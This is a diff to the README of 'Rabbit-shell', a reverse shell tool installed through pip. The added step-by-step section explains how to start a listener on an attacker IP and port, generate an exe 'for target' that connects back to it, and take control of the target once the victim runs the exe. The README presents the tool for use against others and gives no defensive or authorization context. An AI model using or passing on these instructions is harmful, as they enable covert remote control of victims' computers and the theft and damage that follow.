@@ -1,15 +1,17 @@
+![license](https://img.shields.io/github/license/greedalbadi/rabbit-shell)
+![Python](https://img.shields.io/badge/Python-3.9-blue)
 # Rabbit-shell
 
-###### Rabbit shell reverse shell tool.
+###### Rabbit shell advanced reverse shell tool.
 
-
+![tool](rabbit_shell\data\images\Capture.png)
 
 ##  Installation.
 
 
 
 ### By pip.
-
+ 
 ```bash
 pip install rabbit_shell
 ```
@@ -24,6 +26,36 @@ cd rabbit-shell
 pip install .
 ```
 install using git clone.
+
+
+
+## steps.
+
+> 1 - Install rabbit-shell tool.
+>
+> 2 - Generate your key using `--key` command.
+>
+> example: `rsb --key`
+>
+> 3 - run tool on your server using `--server` command along with your server **ip address** and **port** .
+>
+> example: `rsb --server -a 192.168.0.111 -p 9999`
+>
+> 4 - Generate exe for target using `--client` along with your server **ip address** and **port** .
+>
+> example: `rsb --client -a 192.168.0.111 -p 9999`
+>
+> 5 - now to start controlling target on your main device prefferred on windows run `--auth` command.
+>
+> example: `rsb --auth -a 192.168.0.111 -p 9999`
+>
+> - now when your target run your exe will it will be connected and you will can control your target.
+
+
+
+
+
+
 
 # Usage.
 ```bash
@@ -81,7 +113,7 @@ rsb --client -a 192.168.0.111 -p 9999
 
 
 
-## Generate new key.
+## Generate new key\insert key\show key.
 
 ```bash
 rsb --key
@@ -91,13 +123,7 @@ rsb --key
 
 
 
-## To insert key.
 
-```bash
-rsb --key -k your_key
-```
-
-> - -k is the key you want to insert to the tool files.
 
 ## Commands to use from server side.
 
